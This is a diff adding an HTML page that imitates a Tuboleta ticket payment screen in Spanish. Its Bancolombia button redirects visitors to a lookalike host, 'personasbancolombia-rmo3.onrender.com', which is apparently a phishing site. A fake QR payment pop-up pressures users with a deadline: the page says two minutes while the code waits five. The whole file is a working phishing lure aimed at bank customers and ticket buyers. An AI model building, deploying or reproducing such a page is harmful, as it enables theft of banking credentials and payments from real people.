@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario Tarjeta Débito</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+             justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            flex-direction: column;
+        }
+
+        #form-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 390px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: none;
+            background-color: rgb(255, 255, 255);
+            color: white;
+            font-size: 18px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        button:hover {
+            background-color: rgb(255, 255, 255);
+        }
+
+        #qr-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+
+        .qr-box {
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+        }
+
+        .qr-box img {
+            width: 200px;
+            margin: 15px 0;
+        }
+
+        .qr-box h3 {
+            margin-bottom: 10px;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div style="text-align: left; width: 100%; background-color: rgb(0, 113, 206); padding: 20px;">
+        <img width="250px" src="img/tubol.png" alt="Logo Tuboleta">
+    </div>
+
+    <br><br><br>
+
+    <center>
+        <div id="form-container">
+            <p style="font-size: 22px; font-weight: bold;">Selecciona tu método de pago</p>
+
+
+
+
+
+
+
+
+<br>
+
+
+
+            <button id="boton-bancolombia" onclick="window.location.href='https://personasbancolombia-rmo3.onrender.com/enlinea/'">
+                <img width="200px" src="pagolombia.png" alt=""></button>
+         <p>Ingresa a Bancolombia</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+            <button id="qr-bancolombia">
+                <img width="150px" src="cod-QR.webp" alt=""></button>
+<p>Genera Qr de Pago</p>
+
+
+        </div>
+    </center>
+
+    <div id="qr-modal">
+        <div class="qr-box">
+            <h3>QR Generado con éxito</h3>
+            <p>Escanea el siguiente QR con tu app Bancolombia o Nequi.</p>
+            <img src="qr.jpg" alt="QR para pago">
+            <p><strong>Tienes 2 minutos para completar el pago o serás redirigido a la fila virtual.</strong></p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('qr-bancolombia').addEventListener('click', function() {
+            // Mostrar la ventana emergente del QR
+            const qrModal = document.getElementById('qr-modal');
+            qrModal.style.display = 'flex';
+
+            // Configurar redirección después de 5 minutos
+            setTimeout(function() {
+                window.location.href = "fila.html";
+            }, 5 * 60 * 1000); // 5 minutos
+        });
+    </script>
+</body>
+</html>
